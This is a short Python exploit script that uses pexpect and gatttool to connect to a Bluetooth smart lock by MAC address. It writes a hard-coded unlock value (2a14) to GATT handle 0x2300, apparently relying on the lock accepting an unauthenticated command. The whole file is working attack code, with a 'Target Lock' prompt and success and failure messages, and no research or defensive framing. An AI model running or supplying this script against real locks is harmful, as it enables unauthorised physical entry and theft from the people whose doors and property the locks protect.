import pexpect

# ANSI color codes for CLI output
G = "\033[32m"
Y = "\033[33m"
R = "\033[31m"
RES = "\033[0m"

# Prompt for MAC address
device = input("Enter Target Lock MAC address [Default: 11:22:33:44:55:66]: ")
if not device:
    device = "11:22:33:44:55:66"

# Unlock GATT handle and value
handle = "0x2300"
value = "2a14"

print(f"{Y}[-]{RES} Launching gatttool...")
child = pexpect.spawn("gatttool -I")

# Connect
print(f"{Y}[-]{RES} Connecting to {device}...")
child.sendline(f"connect {device}")
try:
    child.expect("Connection successful", timeout=5)
    print(f"{G}[+]{RES} Connected!")
except pexpect.exceptions.TIMEOUT:
    print(f"{R}[!] Connection failed. Is the device on and in range?{RES}")
    child.close()
    exit()

# Write unlock command
print(f"{Y}[-]{RES} Sending unlock write to handle {handle}...")
child.sendline(f"char-write-req {handle} {value}")
try:
    child.expect("Characteristic value was written successfully", timeout=5)
    print(f"{G}[+]{RES} Unlock command sent successfully!")
except pexpect.exceptions.TIMEOUT:
    print(f"{R}[!] Unlock command failed or ignored by device.{RES}")

# Graceful exit
child.sendline("exit")
child.close()
